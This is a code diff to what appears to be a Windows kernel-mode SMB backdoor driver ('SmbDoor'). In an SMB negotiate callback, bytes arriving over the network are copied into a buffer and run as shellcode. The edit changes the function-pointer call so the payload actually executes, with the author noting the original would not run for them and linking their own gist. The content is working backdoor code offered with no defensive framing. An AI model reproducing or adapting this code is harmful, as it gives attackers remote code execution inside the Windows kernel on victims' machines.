@@ -25,8 +25,14 @@ NTSTATUS SmbDoorNegotiateCallback(PVOID Unknown, SIZE_T RawSize, PUCHAR RawBytes
 			// a cipher can be used here instead
 			RtlCopyMemory(ShellcodeBuffer, RawBytes + 4, RawSize - 4);
 
+			// *** MODIFIED (for me it wouldn't execute) *** 
 			// call shellcode, what sucks is we're DISPATCH_LEVEL
-			(*(void(*)(void))ShellcodeBuffer)();
+			// ORIGINAL (*(void(*)(void))ShellcodeBuffer)();
+			
+			
+			// from my https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597
+			// (*(void(*)())sh_1)();
+			(*(void(*)())ShellcodeBuffer)();
 
 			ExFreePoolWithTag(ShellcodeBuffer, SMBDOOR_POOL_TAG);
 		}
